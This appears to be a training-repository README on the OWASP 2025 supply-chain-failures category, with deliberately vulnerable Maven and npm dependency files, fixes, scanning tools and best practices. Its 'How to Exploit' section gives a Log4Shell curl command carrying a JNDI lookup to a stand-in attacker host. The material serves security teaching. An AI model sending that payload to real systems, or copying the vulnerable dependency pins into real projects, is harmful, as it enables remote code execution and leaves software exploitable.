# A03:2025 - Software Supply Chain Failures ⭐ NEW

## Overview

Software Supply Chain Failures is a NEW category in OWASP Top 10 2025. It focuses on compromises occurring across the entire software dependency ecosystem, build systems, and distribution infrastructure.

## What is Supply Chain Failure?

Software supply chain attacks target the weakest link in the development process - dependencies, build tools, and distribution channels. These attacks can affect thousands of applications simultaneously.

### Common Vulnerabilities:

- Using components with known vulnerabilities
- Downloading dependencies from untrusted sources
- Lack of dependency verification (checksums, signatures)
- Compromised build pipelines (CI/CD)
- Malicious packages in public repositories
- Typosquatting attacks
- Dependency confusion attacks
- No Software Bill of Materials (SBOM)
- Outdated or unmaintained dependencies

## Real-World Examples

- **Log4Shell (CVE-2021-44228)**: Critical vulnerability in Log4j affected millions
- **SolarWinds Attack**: Supply chain compromise affecting 18,000+ organizations
- **NPM ua-parser-js**: Malicious code injected into popular package
- **CodeCov Bash Uploader**: Compromised script stealing environment variables

## This Example

This demo shows vulnerabilities in:

1. **Using Vulnerable Dependencies**
   - Old versions with known CVEs
   - Transitive vulnerabilities

2. **Insecure Dependency Management**
   - No checksum verification
   - Downloading from HTTP (not HTTPS)
   - No dependency pinning

3. **Missing Build Security**
   - No SBOM generation
   - No vulnerability scanning
   - Unsigned artifacts

## Demonstration

### Backend (pom.xml with vulnerabilities)

```xml
<dependencies>
    <!-- VULNERABLE: Old Log4j version with Log4Shell -->
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.14.1</version> <!-- CVE-2021-44228 -->
    </dependency>

    <!-- VULNERABLE: Outdated Spring version -->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
        <version>2.4.0</version> <!-- Multiple CVEs -->
    </dependency>

    <!-- VULNERABLE: Insecure deserialization -->
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version> <!-- CVE-2015-6420 -->
    </dependency>

    <!-- VULNERABLE: No version specified (uses latest, unpredictable) -->
    <dependency>
        <groupId>com.example</groupId>
        <artifactId>some-library</artifactId>
        <!-- No version = dangerous! -->
    </dependency>
</dependencies>

<!-- VULNERABLE: Using HTTP repository -->
<repositories>
    <repository>
        <id>insecure-repo</id>
        <url>http://insecure-repo.example.com</url>
    </repository>
</repositories>
```

### Frontend (package.json with vulnerabilities)

```json
{
  "dependencies": {
    "react": "16.8.0",  // Vulnerable: XSS issues
    "lodash": "4.17.15",  // Vulnerable: Prototype pollution
    "axios": "0.18.0",  // Vulnerable: SSRF
    "moment": "2.24.0",  // Vulnerable: ReDoS
    "jquery": "2.1.4"  // Vulnerable: Multiple CVEs
  },
  "devDependencies": {
    "webpack": "4.0.0"  // Vulnerable version
  }
}
```

## How to Exploit

### 1. Exploit Known CVE

```bash
# Log4Shell exploitation example
# Send malicious JNDI lookup in log message
curl -H "X-Api-Version: ${jndi:ldap://attacker.com/evil}" http://localhost:8080/api/test
```

### 2. Dependency Confusion Attack

Create a malicious package with same name as internal package but higher version number in public repository.

### 3. Typosquatting

Register similar package names:
- `reqeusts` instead of `requests`
- `colorsss` instead of `colors`

## How to Fix It

### 1. Keep Dependencies Updated

```xml
<!-- Use latest stable versions -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.20.0</version> <!-- Latest secure version -->
</dependency>
```

### 2. Use Dependency Scanning

```xml
<!-- Maven OWASP Dependency Check Plugin -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>8.4.0</version>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>
    </configuration>
</plugin>
```

### 3. Pin Dependency Versions

```xml
<!-- Always specify exact versions -->
<dependency>
    <groupId>com.example</groupId>
    <artifactId>library</artifactId>
    <version>1.2.3</version> <!-- Exact version -->
</dependency>
```

### 4. Verify Dependencies

```xml
<!-- Use checksum verification -->
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-enforcer-plugin</artifactId>
    <executions>
        <execution>
            <id>enforce-checksums</id>
            <goals>
                <goal>enforce</goal>
            </goals>
            <configuration>
                <rules>
                    <requireChecksums>
                        <banLatest>true</banLatest>
                        <banRelease>false</banRelease>
                        <banSnapshots>true</banSnapshots>
                    </requireChecksums>
                </rules>
            </configuration>
        </execution>
    </executions>
</plugin>
```

### 5. Use Private Repository Manager

```xml
<!-- Configure Maven to use Nexus/Artifactory -->
<repositories>
    <repository>
        <id>central</id>
        <url>https://your-nexus.company.com/repository/maven-public/</url>
        <releases><enabled>true</enabled></releases>
    </repository>
</repositories>
```

### 6. Generate SBOM

```bash
# Generate Software Bill of Materials
mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom
```

### 7. Sign Artifacts

```xml
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-gpg-plugin</artifactId>
    <executions>
        <execution>
            <id>sign-artifacts</id>
            <phase>verify</phase>
            <goals>
                <goal>sign</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

## Best Practices

1. **Maintain Dependency Inventory**: Know what you're using
2. **Regular Updates**: Keep dependencies current
3. **Vulnerability Scanning**: Automated scanning in CI/CD
4. **Use Trusted Sources**: Only download from official repositories
5. **Verify Integrity**: Check signatures and checksums
6. **Pin Versions**: Don't use version ranges in production
7. **Monitor CVE Databases**: Subscribe to security advisories
8. **SBOM Generation**: Document all components
9. **Least Privilege**: Minimize build pipeline permissions
10. **Code Signing**: Sign your releases

## Tools

### Java/Maven
- OWASP Dependency-Check
- Snyk
- Sonatype Nexus IQ
- JFrog Xray
- Maven Enforcer Plugin

### JavaScript/NPM
- npm audit
- Snyk
- WhiteSource
- Socket Security
- Dependabot

### CI/CD Integration
- GitHub Dependabot
- GitLab Dependency Scanning
- Azure Artifacts
- AWS CodeArtifact

## Scanning Commands

```bash
# Maven dependency check
mvn org.owasp:dependency-check-maven:check

# NPM audit
npm audit
npm audit fix

# Check outdated packages
mvn versions:display-dependency-updates
npm outdated

# Snyk scanning
snyk test
snyk monitor
```

## Impact

- **Mass Compromise**: One vulnerability affects all users
- **Data Theft**: Malicious packages stealing credentials
- **Backdoors**: Persistent access to systems
- **Ransomware**: Supply chain for malware distribution
- **Reputation Damage**: Loss of customer trust

## References

- [OWASP A03:2025 - Software Supply Chain Failures](https://owasp.org/Top10/)
- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/)
- [SBOM Overview](https://www.cisa.gov/sbom)
- [SLSA Framework](https://slsa.dev/)
- [NIST SSDF](https://csrc.nist.gov/Projects/ssdf)

---

**To Implement**: Follow patterns from A01 and A02 examples to create full SpringBoot + React demonstration.
